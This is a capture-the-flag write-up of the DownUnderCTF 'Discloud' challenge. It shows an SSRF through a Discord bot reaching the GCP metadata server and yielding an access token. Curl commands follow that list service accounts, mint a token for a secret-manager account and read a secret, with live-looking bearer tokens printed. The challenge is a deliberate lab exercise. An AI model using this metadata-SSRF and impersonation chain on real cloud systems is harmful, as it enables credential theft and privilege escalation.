# Discloud
#### Author: Blue Alder
#### Category: Misc

The cloud is a big place and there's lots there and there are lots of SECRETS. There is a discord bot called MemeSurfer#3829 in the DUCTF discord channel, it has been designed and implemented using GCP CLOUD technologies written using the help of discord.js your mission if you choose to accept it, is to heist the SECRETS of the cloud using this bot. Good Luck.

Note: To interact with the bot please DM it and don't be shy. Usage:

`!meme {list,get,sign}`

---

This is a cloud challenge, and I had not done that much cloud stuff before, so this was exciting :)

In the task description we can see there is a Discord bot called `MemeSurfer#3829` we have to talk to.
The goal of this challenge is probably to pivot the Cloud infrastructure to get access to the SecretManager where you can store Secrets.

![Discord chat](https://i.imgur.com/TPtL1A4.png)

It did not respond at first, but it worked eventually.

We can see there are 3 commands available:
* `!meme list`
* `!meme get`
* `!meme sign`

Let's test what they do!

![Meme list](https://i.imgur.com/zphEgTD.png)

![Meme get](https://i.imgur.com/M3TRxnH.png)

![Meme sign](https://i.imgur.com/KVeHYiJ.png)

---

There are a few memes available via the `!meme list` command, and I bet we can get the memes using the `!meme get` command.

![Meme get](https://i.imgur.com/JgLUIys.png)

Perfect! We got our first meme, but we need to find some kind of vulnerability, so I tried to use some LFI vuln to get /etc/passwd as a test:

![/etc/passwd](https://i.imgur.com/T4CDAhK.png)

We got a file back, let's see whats inside!

```xml
<?xml version='1.0' encoding='UTF-8'?><Error><Code>SignatureDoesNotMatch</Code><Message>The request signature we calculated does not match the signature you provided. Check your Google secret key and signing method.</Message><StringToSign>GOOG4-RSA-SHA256
20200918T124200Z
20200918/auto/storage/goog4_request
17ac1243ec012b97f3ae137629405346f1214d21f953a9d33191b2829c3fc426</StringToSign><CanonicalRequest>GET
/etc/passwd
X-Goog-Algorithm=GOOG4-RSA-SHA256&amp;X-Goog-Credential=memeboy123%40discloud-chal.iam.gserviceaccount.com%2F20200918%2Fauto%2Fstorage%2Fgoog4_request&amp;X-Goog-Date=20200918T124200Z&amp;X-Goog-Expires=3600&amp;X-Goog-SignedHeaders=host
host:storage.googleapis.com

host
UNSIGNED-PAYLOAD</CanonicalRequest></Error>
```

This is not what we expected! It seems like the bot tries to fetch the meme from Google Cloud Storage, but the signature was wrong.
This is probably because of some redirect (That it signed the path with all the `../` we added, but then signature was wrong when it redirected to /etc/passwd).

Anyways, let's keep on going! We get some information from the message above. There is a service account here with the email:
```
memeboy123@discloud-chal.iam.gserviceaccount.com
```

We also now know that the name of the project is `discloud-chal`.

With the `!meme sign` command it looks like we can make presigned links to share with our friends. Here is an example:
![Meme sign](https://i.imgur.com/QtaUYrU.png)

It looks like the name of the bucket is `epic-memez`. I also tried to create a few links to find a vulnerability here, but didn't find 
anything during my few attempts, because I found something else that was interesting.

We can use `!meme get -su` to make the bot fetch internal sites, like the cloud instance's metadata api. This is located at:
http://metadata.google.internal/0.1/meta-data, http://metadata.google.internal/computeMetadata/v1, or http://169.254.169.254/computeMetadata/v1

![Metadata api](https://i.imgur.com/pJuJfX1.png)

The file MemeSurfer sends us contains the following:
```
attached-disks
attributes/
auth-token
auth_token
authorized-keys
authorized_keys
description
domain
hostname
image
instance-id
machine-type
network
numeric-project-id
project-id
service-accounts
service-accounts/
tags
zone
```

This is basically "files" and "folders" containing metadata information.

From here we can get a lot of metadata that can be useful. Project ID, Service account details, zones, instance ID, and so on.
We can also check the scopes of the current service account:
```
!meme get -su http://metadata.google.internal/0.1/meta-data/service-accounts/memeboy123@discloud-chal.iam.gserviceaccount.com
```
```json
{
    "serviceAccounts": [
        {
            "scopes": ["https://www.googleapis.com/auth/cloud-platform"],
            "serviceAccount":"memeboy123@discloud-chal.iam.gserviceaccount.com"
        }
    ]
}
```
With our current scope we can `View and manage your data across Google Cloud Platform services`. This seems pretty neat!

There is also another useful thing we can do with the Compute metadata API. We can create an OAuth2 access token. 
By default, access tokens have the cloud-platform scope, which allows access to all Google Cloud Platform APIs, assuming IAM also allows access.

![Access token](https://i.imgur.com/wP3GOgM.png)

This file contains our new access token that we can use in an `Authorization` header when doing HTTP requests from the outside. Now we don't
have to talk with the bot anymore, but can use this token to access the Google Cloud REST API from our own computer.

```json
{
    "access_token": "ya29.c.Kn_dB1yqILFXvNzBMncPrpCALQ-4dhzfhNjIudh6ZCmaAtBNbGWzjTn9YmBSSxUDplTVcMmcuuKcw6qpK3fc68JT2BI7wrGHLcQ4mifGQ0AyVaQZGJQ1JKQxfIF015gLdNK8SeQjdQufCnXZTvWm0GirhKB7VtmheE1-r09n9khj",
    "expires_in": 3027,
    "token_type": "Bearer"
}
```

This token will expire after a while... But we will be quick! :) Now we can try to get a list of what's inside the `epic-memez` bucket:

`curl -H "Authorization: Bearer ya29.c.Kn_dB1yqILFXvNzBMncPrpCALQ-4dhzfhNjIudh6ZCmaAtBNbGWzjTn9YmBSSxUDplTVcMmcuuKcw6qpK3fc68JT2BI7wrGHLcQ4mifGQ0AyVaQZGJQ1JKQxfIF015gLdNK8SeQjdQufCnXZTvWm0GirhKB7VtmheE1-r09n9khj" 'https://storage.googleapis.com/epic-memez'`
```xml
<ListBucketResult xmlns="http://doc.s3.amazonaws.com/2006-03-01">
  <Name>epic-memez</Name>
  <Prefix/>
  <Marker/>
  <IsTruncated>false</IsTruncated>
  <Contents>
    <Key>png.jpg</Key>
    <Generation>1599978653783100</Generation>
    <MetaGeneration>1</MetaGeneration>
    <LastModified>2020-09-13T06:30:53.782Z</LastModified>
    <ETag>"fbc570ab21631c194cb8bfb02f71aa5c"</ETag>
    <Size>59112</Size>
  </Contents>
  <Contents>
    <Key>pwease.jpg</Key>
    <Generation>1599978653714952</Generation>
    <MetaGeneration>1</MetaGeneration>
    <LastModified>2020-09-13T06:30:53.714Z</LastModified>
    <ETag>"a5d78d68bbe322dd9eb7c0b7cc10d351"</ETag>
    <Size>78556</Size>
  </Contents>
  <Contents>
    <Key>well.jpg</Key>
    <Generation>1599978653713841</Generation>
    <MetaGeneration>1</MetaGeneration>
    <LastModified>2020-09-13T06:30:53.713Z</LastModified>
    <ETag>"d3dc9d37be995443389a5afa070b87b4"</ETag>
    <Size>32300</Size>
  </Contents>
  <Contents>
    <Key>winsad.png</Key>
    <Generation>1599978653838259</Generation>
    <MetaGeneration>1</MetaGeneration>
    <LastModified>2020-09-13T06:30:53.838Z</LastModified>
    <ETag>"84ad4a0d5616f33238540ba028da0114"</ETag>
    <Size>243497</Size>
  </Contents>
</ListBucketResult>
```

It looks like all of the memes we could get from the bot is in this bucket, but nothing else so this is a dead end :(
In the task description there is a hint about SECRETS, so let's look into what we can do with the SecretManager REST API:
https://cloud.google.com/secret-manager/docs/reference/rest

We can apparently get a list of all the available secrets, so what are we waiting for?

`curl -H "Authorization: Bearer ya29.c.Kn_dB1yqILFXvNzBMncPrpCALQ-4dhzfhNjIudh6ZCmaAtBNbGWzjTn9YmBSSxUDplTVcMmcuuKcw6qpK3fc68JT2BI7wrGHLcQ4mifGQ0AyVaQZGJQ1JKQxfIF015gLdNK8SeQjdQufCnXZTvWm0GirhKB7VtmheE1-r09n9khj" 'https://secretmanager.googleapis.com/v1beta1/projects/discloud-chal/secrets'`

```json
{ "error": 
    {
        "code": 403,
        "message": "Permission 'secretmanager.secrets.list' denied for resource 'projects/discloud-chal' (or it may not exist).",
        "status": "PERMISSION_DENIED"
    }
}
```

Oh no! We do not have access to view the secrets... Maybe there is another service account that has this kind of permission? According to the [documentation](https://cloud.google.com/iam/docs/reference/rest/v1/projects.serviceAccounts/list)
we can get a list of all the service account for a specific project using the following request (We remember that the project name is `discloud-chal`):

`curl -H "Authorization: Bearer ya29.c.Kn_dB1yqILFXvNzBMncPrpCALQ-4dhzfhNjIudh6ZCmaAtBNbGWzjTn9YmBSSxUDplTVcMmcuuKcw6qpK3fc68JT2BI7wrGHLcQ4mifGQ0AyVaQZGJQ1JKQxfIF015gLdNK8SeQjdQufCnXZTvWm0GirhKB7VtmheE1-r09n9khj" 'https://iam.googleapis.com/v1/projects/discloud-chal/serviceAccounts'`
```json
{
  "accounts": [
    {
      "name": "projects/discloud-chal/serviceAccounts/940676843154-compute@developer.gserviceaccount.com",
      "projectId": "discloud-chal",
      "uniqueId": "103897546930383781490",
      "email": "940676843154-compute@developer.gserviceaccount.com",
      "displayName": "Compute Engine default service account",
      "etag": "MDEwMjE5MjA=",
      "oauth2ClientId": "103897546930383781490"
    },
    {
      "name": "projects/discloud-chal/serviceAccounts/secret-manager@discloud-chal.iam.gserviceaccount.com",
      "projectId": "discloud-chal",
      "uniqueId": "100479552989971744784",
      "email": "secret-manager@discloud-chal.iam.gserviceaccount.com",
      "displayName": "gets da secrets",
      "etag": "MDEwMjE5MjA=",
      "oauth2ClientId": "100479552989971744784"
    },
    {
      "name": "projects/discloud-chal/serviceAccounts/memeboy123@discloud-chal.iam.gserviceaccount.com",
      "projectId": "discloud-chal",
      "uniqueId": "108544651382203580242",
      "email": "memeboy123@discloud-chal.iam.gserviceaccount.com",
      "displayName": "gets da memes",
      "etag": "MDEwMjE5MjA=",
      "oauth2ClientId": "108544651382203580242"
    }
  ]
}
```

This looks very promising! We actually found 3 service accounts :+1:

`secret-manager@discloud-chal.iam.gserviceaccount.com` is probably the account we want to use, but how can we authenticate as this account?

There is actually an API for creating access tokens for a specific service account here: https://cloud.google.com/iam/docs/reference/credentials/rest/v1/projects.serviceAccounts/generateAccessToken

Let's check if it works!

We now need to do the following POST request:

`curl -H 'authorization: Bearer ya29.c.Kn_dB1yqILFXvNzBMncPrpCALQ-4dhzfhNjIudh6ZCmaAtBNbGWzjTn9YmBSSxUDplTVcMmcuuKcw6qpK3fc68JT2BI7wrGHLcQ4mifGQ0AyVaQZGJQ1JKQxfIF015gLdNK8SeQjdQufCnXZTvWm0GirhKB7VtmheE1-r09n9khj' https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/secret-manager@discloud-chal.iam.gserviceaccount.com:generateAccessToken -XPOST -H 'content-type: application/json' --data '{"delegates":[],"scope":["https://www.googleapis.com/auth/cloud-platform"]}'`

I first tried to send an empty `scope` value, but that did not work, so I set it to `https://www.googleapis.com/auth/cloud-platform`. We now get an access token back!

```json
{
  "accessToken": "ya29.c.Ko4C3Qf-S8rcLf1PkZildJPzRHxI60kqRM414NUfZYolVvSugFRMevK2nMs_2I_X9ScCf7JssEeNrQWrjlXZxwv6L0AR8tLGXpgzCaSE_XUpIuhie1zgcWukTbL24eHzQfUFPg_oPazKbSOitKYd4WC9izaniIG_z0IrF0FxEex4tbP_awrsJut6KSDg14oiqkUS2G0Nq7U8gN32NCmSp2zmSCgA5wODE92SrXSTYS-XZqIrzOS8vUqwz0oqSd0b-wlpKfMdd6N7quUgCltNfKi3tAOIrvvA6OK5-iBdKarQnZ1skm6wfqZujMo9yt5moELuT87ZYPxMhb2ZNIg8iQmxbwnV4gNwVPnGNzA5_S8z",
  "expireTime": "2020-09-18T17:17:25Z"
}
```

Now we can try to use this access token to get a list of all the secrets like we tried earlier.

`curl -H 'authorization: Bearer ya29.c.Ko4C3Qf-S8rcLf1PkZildJPzRHxI60kqRM414NUfZYolVvSugFRMevK2nMs_2I_X9ScCf7JssEeNrQWrjlXZxwv6L0AR8tLGXpgzCaSE_XUpIuhie1zgcWukTbL24eHzQfUFPg_oPazKbSOitKYd4WC9izaniIG_z0IrF0FxEex4tbP_awrsJut6KSDg14oiqkUS2G0Nq7U8gN32NCmSp2zmSCgA5wODE92SrXSTYS-XZqIrzOS8vUqwz0oqSd0b-wlpKfMdd6N7quUgCltNfKi3tAOIrvvA6OK5-iBdKarQnZ1skm6wfqZujMo9yt5moELuT87ZYPxMhb2ZNIg8iQmxbwnV4gNwVPnGNzA5_S8z' https://secretmanager.googleapis.com/v1beta1/projects/discloud-chal/secrets`

```json
{
  "name": "projects/940676843154/secrets/big_secret",
  "replication": {
    "automatic": {}
  },
  "createTime": "2020-09-13T06:32:31.797548Z"
}
```

Nice, there is a `big_secret` here! :+1:

But what does it contain? According to the [documentation](https://cloud.google.com/secret-manager/docs/reference/rest/v1beta1/projects.secrets.versions/access) we need to add `:access` to access the data we want:

curl -H 'authorization: Bearer ya29.c.Ko4C3Qf-S8rcLf1PkZildJPzRHxI60kqRM414NUfZYolVvSugFRMevK2nMs_2I_X9ScCf7JssEeNrQWrjlXZxwv6L0AR8tLGXpgzCaSE_XUpIuhie1zgcWukTbL24eHzQfUFPg_oPazKbSOitKYd4WC9izaniIG_z0IrF0FxEex4tbP_awrsJut6KSDg14oiqkUS2G0Nq7U8gN32NCmSp2zmSCgA5wODE92SrXSTYS-XZqIrzOS8vUqwz0oqSd0b-wlpKfMdd6N7quUgCltNfKi3tAOIrvvA6OK5-iBdKarQnZ1skm6wfqZujMo9yt5moELuT87ZYPxMhb2ZNIg8iQmxbwnV4gNwVPnGNzA5_S8z' https://secretmanager.googleapis.com/v1beta1/projects/discloud-chal/secrets/big_secret/versions/latest:access

Running the command above yields the flag: `DUCTF{bot_boi_2_cloud_secrets}`

Listing the service accounts and creating an access token for secret-manager was apparently an unintended way of solving this challenge. The intended
way (written by the author) can be found [here](https://github.com/DownUnderCTF/Challenges_2020_public/blob/master/misc/discloud/writeup.md).

